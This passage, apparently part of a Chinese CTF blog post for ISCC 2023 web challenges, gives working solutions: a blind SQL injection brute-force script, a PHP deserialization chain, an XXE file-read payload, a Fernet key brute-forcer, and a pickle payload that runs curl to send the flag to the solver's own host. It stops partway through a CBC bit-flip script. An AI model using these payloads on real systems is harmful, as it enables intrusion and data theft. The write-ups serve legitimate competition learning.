+        &amp;quot;Upgrade-Insecure-Requests&amp;quot;: &amp;quot;1&amp;quot;,
+        &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&amp;quot;,
+        &amp;quot;Accept&amp;quot;: &amp;quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&amp;quot;,
+        &amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
+        &amp;quot;Accept-Language&amp;quot;: &amp;quot;zh-CN,zh;q=0.9,ru;q=0.8,eo;q=0.7&amp;quot;,
+        &amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;
+    &amp;#125;
+    response = requests.get(url=url,cookies=cookie,headers=header)
+    # print(response.text)
+    while (response.text.find(&amp;#39;too fast!!!&amp;#39;) &amp;gt; 0):
+        time.sleep(2)
+    while(response.text.find(&amp;#39;innerHTML=Math.round(Math.random()*100)&amp;#39;)&amp;gt;0):
+        time.sleep(2)
+        response = requests.get(url=url, cookies=cookie, headers=header)
+    print(str(i)+&amp;quot;======&amp;quot;)
+    time.sleep(1)
+    info = extract_info(response.text)
+    for key, value in info.items():
+        print(str(key) + &amp;#39;: &amp;#39; + str(value))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241150113.png&#34; alt=&#34;image-20230524115019060&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后发现在487561识别了一个很奇怪的值，而且体力值是一个ip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241239968.png&#34; alt=&#34;image-20230524123932900&#34;&gt;&lt;/p&gt;
+&lt;p&gt;去访问看一下，去年的套路今年接着用，，，，挺离谱&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241240835.png&#34; alt=&#34;image-20230524124052761&#34;&gt;&lt;/p&gt;
+&lt;p&gt;羊名解码后果然是美羊羊，也看到描述有fl4g注入点就在这个地方了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241242362.png&#34; alt=&#34;image-20230524124208287&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在这里输入危险字符发现有过滤，应该是sql注入，注入点就在这里了，简单测试一下waf&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;waf： =，/*，select，and，or，union，【空格】，sleep，&amp;#39;，&amp;quot;，&amp;#39;,&amp;#39;，&amp;lt;&amp;gt;，regexp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;限制很多，这里union和’,’都被过滤，就不考虑常规的注入，这里发现like没有过滤，这里利用like盲注&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241954386.png&#34; alt=&#34;image-20230524195442323&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到是由fl4g这个列，因为单引号和双引号被过滤，所以这里使用编码方式绕过&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241951402.png&#34; alt=&#34;image-20230524195120332&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241951519.png&#34; alt=&#34;image-20230524195140441&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到第一个字符是I，写个脚本来爆破一下，发现有长度限制，这里用模糊查询&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
+import time
+
+cookies = &amp;#123;
+    &amp;#39;csrftoken&amp;#39;: &amp;#39;xm0lmDwgZibp3KuHHgFjgHb3b9Lo2PxpdcHz6TqmuHKl731mlg4sT1t8C7LVXjTv&amp;#39;,
+    &amp;#39;PHPSESSID&amp;#39;: &amp;#39;v6q21f2a4m8udue4664j1ooh5u&amp;#39;,
+    &amp;#39;Auth_Key&amp;#39;: &amp;#39;XxA8UIdzpPzCjX%2FdPFgGgg%3D%3D&amp;#39;,
+    &amp;#39;Cyber_info&amp;#39;: &amp;#39;GODICWnAlGHG5KhM%2F%2Bl%2FmDL%2FT%2B%2FM%2B3Y06%2BvUFqxxpq4W4KmKr8C0rizMmoIfZJnweV4VafZ7iLVEXGWmgB95%2BUIRceCkk5gY2BI9bX9E%2F9Q%3D&amp;#39;,
+    &amp;#39;sessionid&amp;#39;: &amp;#39;lkipk7j8axhrt344kou1bbkd9jvor3m1&amp;#39;,
+&amp;#125;
+
+headers = &amp;#123;
+    &amp;quot;Cache-Control&amp;quot;: &amp;quot;max-age=0&amp;quot;,
+    &amp;quot;Upgrade-Insecure-Requests&amp;quot;: &amp;quot;1&amp;quot;,
+    &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&amp;quot;,
+    &amp;quot;Accept&amp;quot;: &amp;quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&amp;quot;,
+    &amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
+    &amp;quot;Accept-Language&amp;quot;: &amp;quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&amp;quot;,
+    &amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;
+&amp;#125;
+flag=&amp;#39;&amp;#125;&amp;#39;
+str1=&amp;#39;&amp;#125;&amp;#39;
+str2=&amp;#39;&amp;#39;
+str_list = &amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#123;&amp;#125;&amp;#39;
+while(1):
+    for i in str_list:
+        # url = f&amp;quot;http://47.94.14.162:10001/Details/search?id=-487561)||fl4g%20like%20binary%200x25&amp;#123;bytes(str1,&amp;#39;utf-8&amp;#39;).hex()&amp;#125;&amp;#123;bytes(str2,&amp;#39;utf-8&amp;#39;).hex()&amp;#125;&amp;#123;bytes(i,&amp;#39;utf-8&amp;#39;).hex()&amp;#125;25--+&amp;quot;#拿前一部分
+        url = f&amp;quot;http://47.94.14.162:10001/Details/search?id=-487561)||fl4g%20like%20binary%200x25&amp;#123;bytes(i,&amp;#39;utf-8&amp;#39;).hex()&amp;#125;&amp;#123;bytes(str2,&amp;#39;utf-8&amp;#39;).hex()&amp;#125;&amp;#123;bytes(str1,&amp;#39;utf-8&amp;#39;).hex()&amp;#125;25--+&amp;quot;#拿后以部分
+        print(url)
+        time.sleep(0.8)
+        re = requests.get(url=url,cookies=cookies,headers=headers)
+        if &amp;quot;fl4g&amp;quot; in re.text:
+            str2=i
+            str1=&amp;#39;&amp;#39;
+            flag = flag+i
+            print(flag)
+            break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242201696.png&#34; alt=&#34;image-20230524220105608&#34;&gt;&lt;/p&gt;
+&lt;p&gt;逆序一下就是flag&lt;/p&gt;
+&lt;h3 id=&#34;Where-is-your-love&#34;&gt;&lt;a href=&#34;#Where-is-your-love&#34; class=&#34;headerlink&#34; title=&#34;Where_is_your_love&#34;&gt;&lt;/a&gt;Where_is_your_love&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011306103.png&#34; alt=&#34;image-20230501130615311&#34;&gt;&lt;/p&gt;
+&lt;p&gt;还是看源码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011307763.png&#34; alt=&#34;image-20230501130707717&#34;&gt;&lt;/p&gt;
+&lt;p&gt;有三个文件，第一个是下载公钥&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011307627.png&#34; alt=&#34;image-20230501130732584&#34;&gt;&lt;/p&gt;
+&lt;p&gt;LoveStory.php文件是题目入口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011308789.png&#34; alt=&#34;image-20230501130820726&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Enc.php&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251048876.png&#34; alt=&#34;image-20230525104832716&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?&amp;gt; &amp;lt;?php
+include(&amp;quot;./xxxiscc.php&amp;quot;);
+class boy &amp;#123;
+    public $like;
+    public function __destruct() &amp;#123;
+        echo &amp;quot;能请你喝杯奶茶吗？&amp;lt;br&amp;gt;&amp;quot;;
+        @$this-&amp;gt;like-&amp;gt;make_friends();
+    &amp;#125;
+    public function __toString() &amp;#123;
+        echo &amp;quot;拱火大法好&amp;lt;br&amp;gt;&amp;quot;;
+        return $this-&amp;gt;like-&amp;gt;string;
+    &amp;#125;
+&amp;#125;
+
+class girl &amp;#123;
+    private $boyname;
+    public function __call($func, $args) &amp;#123;
+        echo &amp;quot;我害羞羞&amp;lt;br&amp;gt;&amp;quot;;
+        isset($this-&amp;gt;boyname-&amp;gt;name);  
+    &amp;#125;
+&amp;#125;
+
+class helper &amp;#123;
+    private $name;
+    private $string;
+    public function __construct($string) &amp;#123;
+        $this-&amp;gt;string = $string;
+    &amp;#125;
+    public function __isset($val) &amp;#123;
+        echo &amp;quot;僚机上线&amp;lt;br&amp;gt;&amp;quot;;
+        echo $this-&amp;gt;name;
+    &amp;#125;
+    public function __get($name) &amp;#123;
+        echo &amp;quot;僚机不懈努力&amp;lt;br&amp;gt;&amp;quot;;
+        $var = $this-&amp;gt;$name;
+        $var[$name]();
+    &amp;#125;
+&amp;#125;
+class love_story &amp;#123;
+    public function love() &amp;#123;
+        echo &amp;quot;爱情萌芽&amp;lt;br&amp;gt;&amp;quot;;
+        array_walk($this, function($make, $colo)&amp;#123;
+            echo &amp;quot;坠入爱河，给你爱的密码&amp;lt;br&amp;gt;&amp;quot;;
+            if ($make[0] === &amp;quot;girl_and_boy&amp;quot; &amp;amp;&amp;amp; $colo === &amp;quot;fall_in_love&amp;quot;) &amp;#123;
+                global $flag;
+                echo $flag;
+            &amp;#125;
+        &amp;#125;);
+    &amp;#125;
+&amp;#125;
+
+if (isset($_GET[&amp;quot;iscc&amp;quot;])) &amp;#123;
+    $a=unserialize($_GET[&amp;#39;iscc&amp;#39;]);
+&amp;#125; else &amp;#123;
+    highlight_file(__FILE__);
+&amp;#125; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;反序列化&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+class boy &amp;#123;
+    public $like;
+    public function __destruct() &amp;#123;
+        @$this-&amp;gt;like-&amp;gt;make_friends();//触发call
+    &amp;#125;
+
+    public function __toString() &amp;#123;
+        return $this-&amp;gt;like-&amp;gt;string;//触发get
+    &amp;#125;
+&amp;#125;
+
+class girl &amp;#123;
+    public $boyname;
+    public function __call($func, $args) &amp;#123;
+        isset($this-&amp;gt;boyname-&amp;gt;name);  //触发isset
+    &amp;#125;
+&amp;#125;
+
+class helper &amp;#123;
+    public $name;
+    public $string;
+    public function __construct($string) &amp;#123;
+        $this-&amp;gt;string = $string;
+    &amp;#125;
+    public function __isset($val) &amp;#123;
+        echo $this-&amp;gt;name;
+    &amp;#125;
+    public function __get($name) &amp;#123;
+        $var = $this-&amp;gt;$name;
+        $var[$name]();
+    &amp;#125;
+&amp;#125;
+class love_story &amp;#123;
+    public function love() &amp;#123;//触发walk
+        array_walk($this, function($make, $colo)&amp;#123;
+            if ($make[0] === &amp;quot;girl_and_boy&amp;quot; &amp;amp;&amp;amp; $colo === &amp;quot;fall_in_love&amp;quot;) &amp;#123;
+                global $flag;
+                echo $flag;
+            &amp;#125;
+        &amp;#125;);
+    &amp;#125;
+&amp;#125;
+$a = new boy();
+$a-&amp;gt;like = new girl();
+$a-&amp;gt;like-&amp;gt;boyname = new helper(null);
+$a-&amp;gt;like-&amp;gt;boyname-&amp;gt;name = new boy();
+$a-&amp;gt;like-&amp;gt;boyname-&amp;gt;name-&amp;gt;like = new helper(null);
+$b = new love_story();
+$b -&amp;gt; fall_in_love =array(&amp;quot;girl_and_boy&amp;quot;);
+$c = array(&amp;quot;string&amp;quot;=&amp;gt;array($b,&amp;quot;love&amp;quot;));
+$a-&amp;gt;like-&amp;gt;boyname-&amp;gt;name-&amp;gt;like-&amp;gt;string = $c;
+$a-&amp;gt;like-&amp;gt;boyname-&amp;gt;name-&amp;gt;like-&amp;gt;name=&amp;quot;0&amp;quot;;
+echo urlencode(serialize($a));
+//O%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A4%3A%22girl%22%3A1%3A%7Bs%3A7%3A%22boyname%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A4%3A%22name%22%3BO%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A1%3A%220%22%3Bs%3A6%3A%22string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A10%3A%22love_story%22%3A1%3A%7Bs%3A12%3A%22fall_in_love%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22girl_and_boy%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22love%22%3B%7D%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D%7D%7D
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011309481.png&#34; alt=&#34;image-20230501130924433&#34;&gt;&lt;/p&gt;
+&lt;p&gt;链子难度一般，最后love的调用挺有意思，这里使用数组过的，本地测了一下php是非线程安全的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305052008692.png&#34; alt=&#34;image-20230505200851642&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里通过前面的公钥来解密，先通过openssl拿到n和e&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251102111.png&#34; alt=&#34;image-20230525110216013&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;用yafu分解n&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251105609.png&#34; alt=&#34;image-20230525110556501&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from Crypto.Util.number import *
+
+p=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922206967
+q=147080233415299360057845495186390765586922902910770748924042642102066002833475419563625282038534033761523277282491713393841245804046571337610325158434942879464810055753965320619327164976752647165681046903418924945132096866002693037715397450918689064404951199247250188795306045444756953833882242163199922205709
+n=21632595061498942456591176284485458726074437255982049051386399661866343401307576418742779935973203520468696897782308820580710694887656859447653301575912839865540207043886422473424543631000613842175006881377927881354616669050512971265340129939652367389539089568185762381769176974757484155591541925924309034566325122477217195694622210444478497422147703839359963069352123250114163369656862332886519324535078617986837018261033100555378934126290111146362437878180948892817526628614714852292454750429061910217210651682864700027396878086089765753730027466491890569705897416499997534143482201450410155650707746775053846974603
+e=65537
+
+d=inverse(e,(p-1)*(q-1))
+f=open(&amp;#39;F:\\迅雷下载\\letter.php&amp;#39;, &amp;#39;rb&amp;#39;)
+c = f.read()
+c=bytes_to_long(c)
+m=pow(c,d,n)
+print(long_to_bytes(m))
+f.close()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到加密的脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+function enc($data)&amp;#123;
+        $str=&amp;quot;&amp;quot;;
+        $a=strrev(str_rot13($data)); 
+        for($i=0;$i&amp;lt;strlen($a);$i++)&amp;#123;
+                $b=ord($a[$i])+10;
+                $c=$b^100;
+                $e=sprintf(&amp;quot;%02x&amp;quot;,$c);     
+                $str.=$e; 
+                &amp;#125;
+                return $str;
+            &amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后写一个解密脚本拿到flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import binascii
+
+def rot13(message):
+    res = &amp;#39;&amp;#39;
+    for item in message:
+        if (ord(item)&amp;gt;= ord(&amp;#39;A&amp;#39;) and ord(item)&amp;lt;= ord(&amp;#39;M&amp;#39;)) or (ord(item)&amp;gt;= ord(&amp;#39;a&amp;#39;) and ord(item)&amp;lt;= ord(&amp;#39;m&amp;#39;)):
+            res += chr(ord(item)+13)
+        elif (ord(item)&amp;gt;= ord(&amp;#39;N&amp;#39;) and ord(item)&amp;lt;= ord(&amp;#39;Z&amp;#39;)) or (ord(item)&amp;gt;= ord(&amp;#39;n&amp;#39;) and ord(item)&amp;lt;= ord(&amp;#39;z&amp;#39;)):
+            res += chr(ord(item)-13)
+        else:
+            res += item
+    return res
+
+c = b&amp;#39;e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e13e3e3404&amp;#39;
+c = binascii.a2b_hex(c)[::-1]
+print(c)
+m = &amp;#39;&amp;#39;
+for i in c:
+    t = (i ^ 100) - 10
+    m = m + chr(t)
+print(rot13(m))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242202704.png&#34; alt=&#34;image-20230524220234641&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ISCC单身节抽奖&#34;&gt;&lt;a href=&#34;#ISCC单身节抽奖&#34; class=&#34;headerlink&#34; title=&#34;ISCC单身节抽奖&#34;&gt;&lt;/a&gt;ISCC单身节抽奖&lt;/h3&gt;&lt;p&gt;登录后再后台看到一个注释的token&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242203190.png&#34; alt=&#34;image-20230524220358123&#34;&gt;&lt;/p&gt;
+&lt;p&gt;反序列化后的内容，这里很明显是用户的账号信息被序列化后替换，构造payload然后使得sdog的值为1&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ccccccc1234567&amp;quot;;s:8:&amp;quot;username&amp;quot;;s:64:&amp;quot;cccccccc&amp;quot;;s:4:&amp;quot;sdog&amp;quot;;i:1;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242240512.png&#34; alt=&#34;image-20230524224010420&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入后可以下载凭证，这里存在任意文件下载&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242322070.png&#34; alt=&#34;image-20230524232217966&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里下载apidemo.php,很明显的xxe，构造payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE name[
+&amp;lt;!ENTITY admin SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;
+]&amp;gt;
+&amp;lt;user&amp;gt;
+     &amp;lt;name&amp;gt;&amp;amp;admin;&amp;lt;/name&amp;gt;
+     &amp;lt;isdog&amp;gt;singledog&amp;lt;/isdog&amp;gt;
+     &amp;lt;award&amp;gt;4090Ti&amp;lt;/award&amp;gt;
+&amp;lt;/user&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242328350.png&#34; alt=&#34;image-20230524232848249&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;上大号说话&#34;&gt;&lt;a href=&#34;#上大号说话&#34; class=&#34;headerlink&#34; title=&#34;上大号说话&#34;&gt;&lt;/a&gt;上大号说话&lt;/h3&gt;&lt;p&gt;扫web4目录给的脚本&amp;#x2F;.git&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;Python&#34;&gt;class ED:
+    def __init__(self):#通过随机数生成密钥
+        self.file_key = ...  # 1Aa
+        self.cipher_suite = Fernet(self.generate_key(self.file_key))#Fernet是对称加密的一种实现方式
+
+    def crypto(self, base_str):
+        return self.cipher_suite.encrypt(base_str)#加密
+
+    @staticmethod
+    def generate_key(key: str):#这里是生成密钥的函数
+        key_byte = key.encode()
+        return base64.urlsafe_b64encode(key_byte + b&amp;#39;0&amp;#39; * 28)#base64是一种编码方式，urlsafe_b64encode是base64的一种变种
+
+
+def check_cookies(cookie):
+    ed = ED()
+    f, result = ed.decrypto(cookie)#ed.decrypto是解密
+    black_list = ...
+    if not result[0:2] == b&amp;#39;\x80\x03&amp;#39;:#b&amp;#39;\x80\x03&amp;#39;是pickle序列化后的字节流的开头
+        return False
+    ...
+    try:
+        result = pickle.loads(result)#pickle.loads是将字节流反序列化成对象
+        if result.name == &amp;#39;mabaoguo&amp;#39; and result.random == mabaoguo.random and result.gongfu == mabaoguo.gongfu:#这里是判断对象的属性是否和预设的一致
+            return flag
+        else:
+            return result.name
+    except:
+        return False
+
+
+@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])
+def index():
+    if request.method == &amp;#39;POST&amp;#39;:
+        name = request.form[&amp;#39;input_field&amp;#39;]
+        name = Member(name)
+        name_pick = pickle.dumps(name, protocol=3)#pickle.dumps是将对象序列化成字节流，protocol是序列化时采用的协议版本，3是python3的协议版本
+        name_pick = pickletools.optimize(name_pick)#pickletools.optimize是优化pickle序列化后的字节流
+        ed = ED()
+        response = make_response(redirect(&amp;#39;/&amp;#39;))#make_response是将返回的内容封装成response对象
+        response.set_cookie(&amp;#39;name&amp;#39;, ed.crypto(name_pick).decode())#set_cookie是设置cookie，ed.crypto是加密，decode是将字节流转换成字符串
+        return response
+
+    temp_cookies = request.cookies.get(&amp;#39;name&amp;#39;)#request.cookies.get是获取cookie
+
+    if not temp_cookies:
+        ...
+    else:
+        f = check_cookies(temp_cookies)
+        ...
+
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+    app.run()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;爆破出file_key 密钥&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import itertools
+import pickle
+import cryptography
+import base64
+from enum import member
+from json import dump
+import pickletools
+from cryptography.fernet import Fernet
+
+
+class ED:
+    def __init__(self,key):
+        # self.file_key = ...  # 1Aa
+        self.file_key = key
+        self.cipher_suite = Fernet(self.generate_key(self.file_key))
+
+    def change(self, key):
+        self.cipher_suite = Fernet(self.generate_key(key))
+
+    def crypto(self, base_str):
+        return self.cipher_suite.encrypt(base_str)
+ 
+
+    def decrypto(self, base_str):
+        print(self.cipher_suite.decrypt(base_str))
+        return self.cipher_suite.decrypt(base_str)
+    @staticmethod
+    def generate_key(key: str):
+        key_byte = key.encode()
+        return base64.urlsafe_b64encode(key_byte + b&amp;#39;0&amp;#39; * 28)
+
+# 定义字符集
+charset = &amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;
+# # 定义密钥长度范围
+min_length = 4
+max_length = 4
+# 循环尝试所有可能的密钥组合
+for length in range(min_length, max_length+1):
+    for guess in itertools.product(charset, repeat=length):
+        key = &amp;#39;&amp;#39;.join(guess)
+        # 在此处使用密钥尝试打开加密文件或进行其他操作
+        ed = ED(key=key)
+        try:
+            decrypted_data = ed.decrypto(
+                &amp;#39;gAAAAABkU29cl7FsmN4fcEarM0esqSSe-ht2eaL-9DjMT2K18JGsAd0KFWaXtg4SslOG5ZIlv12E6BgRgUcrQR2bO0AwXvWLxSoi8Fv2x0XegfvFARjSMFH999KD93aMOfPK5uWuhlD9HaiRMKYVCChifxSsTkj_3WoSGrR__a0CZcnPo1xQcc4=&amp;#39;)
+            # 解密成功，返回结果
+            print (decrypted_data)
+            print(key)
+        except cryptography.fernet.InvalidToken:
+            # 密钥不正确，继续循环下一个密钥
+            continue
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里接着打python反序列化&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import base64
+import requests
+from fernet import Fernet
+
+
+def generate_key(key: str):
+    key_byte = key.encode()
+    return base64.urlsafe_b64encode(key_byte + b&amp;#39;0&amp;#39; * 28)
+exp = &amp;quot;\x80\x03(Vcurl ip/`cat fla*|base64`\niposix\nsystem\n.&amp;quot;#ip用自己的
+f = Fernet(generate_key(&amp;#39;5MbG&amp;#39;))
+ck = f.encrypt(exp).decode()
+print(requests.get(&amp;quot;http://47.94.14.162:10004/&amp;quot;,cookies=&amp;#123;&amp;quot;name&amp;quot;:ck&amp;#125;).text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;ISCC滥用职权-3&#34;&gt;&lt;a href=&#34;#ISCC滥用职权-3&#34; class=&#34;headerlink&#34; title=&#34;ISCC滥用职权-3&#34;&gt;&lt;/a&gt;ISCC滥用职权-3&lt;/h3&gt;&lt;p&gt;随便注册一个号登进去&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106390.png&#34; alt=&#34;image-20230524210352073&#34;&gt;&lt;/p&gt;
+&lt;p&gt;随便一改这里的Auth key&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106741.png&#34; alt=&#34;image-20230524210404157&#34;&gt;&lt;/p&gt;
+&lt;p&gt;刷新&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106371.png&#34; alt=&#34;image-20230524210415003&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以直接用cbc翻转&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import urllib.parse
+import requests
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad,unpad
+from Crypto.Util.strxor import strxor
+
+# 这里可控的是iv
+
+real_iv = base64.b64decode(&amp;#39;WQ1eYrDvXCKueNoi7QHdPA==&amp;#39;)
+print(real_iv)
+
+
+# url = &amp;quot;http://47.94.14.162:10014/normal.php&amp;quot;
+# cookie = &amp;#123;&amp;quot;Auth_Key&amp;quot;:urllib.parse.quote(&amp;quot;WQ1eYrDvXCKueNoi7QHdPA==&amp;quot;),&amp;quot;Cyber_info&amp;quot;:urllib.parse.quote(&amp;quot;ukOsB0IG9nfqN8S0eUuC92aBh7sbNoJDcVYCMccBQo+dpoPHI91BXCryxiHjBKtsD0/N3rY5+mIvuHK22WDDV/AsYHMH8FzgAXAIRiGj09YC0N/XUWV78++LH0ovuQB4&amp;quot;),&amp;quot;PHPSESSID&amp;quot;:&amp;quot;acak5gn1r8pc670ve0lrel2u8u&amp;quot;&amp;#125;
+# print(requests.get(url,cookies=cookie).text)
+
+auth = &amp;#39;a:3:&amp;#123;s:8:&amp;quot;deppartm&amp;quot;;s:5:&amp;quot;sale1&amp;quot;;s:8:&amp;quot;username&amp;quot;;s:3:&amp;quot;enj&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;&amp;#125;&amp;#39;
+c = base64.b64decode(&amp;quot;ukOsB0IG9nfqN8S0eUuC92aBh7sbNoJDcVYCMccBQo+dpoPHI91BXCryxiHjBKtsD0/N3rY5+mIvuHK22WDDV/AsYHMH8FzgAXAIRiGj09YC0N/XUWV78++LH0ovuQB4&amp;quot;)
+c0 = c[:16]
+m1 = b&amp;#39;tm&amp;quot;;s:5:&amp;quot;sale1&amp;quot;;&amp;#39;
+target1 = b&amp;#39;tm&amp;quot;;s:5:&amp;quot;techn&amp;quot;;&amp;#39;
+# c_是解密后未异或的值
+c_1 = strxor(m1,c0)
+# 伪造的第一个密文块
